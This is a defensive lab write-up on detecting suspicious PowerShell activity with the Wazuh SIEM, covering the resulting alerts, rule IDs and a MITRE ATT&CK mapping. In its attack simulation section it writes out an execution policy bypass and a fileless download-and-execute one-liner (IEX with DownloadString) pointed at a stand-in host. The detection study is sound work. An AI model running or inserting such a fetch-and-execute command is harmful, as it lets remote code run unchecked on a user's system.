## LAB 006: Suspicious PowerShell Activity Detection (Wazuh)



### Overview

This lab demonstrates detection and analysis of suspicious PowerShell activity using Wazuh SIEM. The objective was to simulate attacker behavior and investigate how system logs and alerts respond to potentially malicious commands.



### Environment

- Windows Virtual Machine (Wazuh Agent Installed)  
- Wazuh SIEM Dashboard  
- PowerShell (Administrator)  



### Attack Simulation

The following PowerShell commands were executed:

1. Execution Policy Bypass with process enumeration:

powershell -ExecutionPolicy Bypass -Command "Get-Process"

2. Simulated remote script execution:

powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://example.com/script.ps1')"



### Observations

- The second command attempted to download and execute a remote script  
- The request returned a 404 Not Found error  
- The script did not execute successfully  
- Despite failure, multiple alerts were triggered in Wazuh  

Detected alerts included:

- Windows System Error Events (Rule 61102)  
- Multiple System Error Events (Rule 61110)  
- Shell stopped unexpectedly (Rule 60778)  



### Analysis

The PowerShell command included several suspicious indicators:

- Execution policy bypass  
- In-memory execution using IEX  
- Remote script retrieval using DownloadString  

These techniques are commonly used in fileless malware attacks.

Although the script failed due to a 404 error, the behavior still triggered system activity and alerts in Wazuh.

The unexpected shell termination and system errors were likely caused by the failed execution attempt.

This demonstrates that even unsuccessful attack attempts can generate detectable signals.



### MITRE ATTACK Mapping

- T1059.001 - PowerShell  
- T1105 - Ingress Tool Transfer  


### Conclusion

The activity observed in this lab represents simulated malicious behavior.

While no payload was successfully executed, the techniques used closely mirror real-world attacker methods.

Wazuh successfully detected abnormal system behavior and generated alerts, confirming its effectiveness in identifying suspicious PowerShell activity.


### Screenshots

#### 1. PowerShell Command
This shows the PowerShell command used to simulate suspicious activity.
![PowerShell Command](01-powershell-command.png)

#### 2. Wazuh Alerts
This shows the alerts generated in Wazuh from the PowerShell activity.
![Wazuh Alerts](02-wazuh-alerts.png)

#### 3. Error Output
This shows the failed execution and resulting shell error.
![Error Output](03-shell-error.png)

### Key Takeaway

Even failed attack attempts leave traces.

Monitoring PowerShell activity and correlating system events is critical for early detection of potential threats.
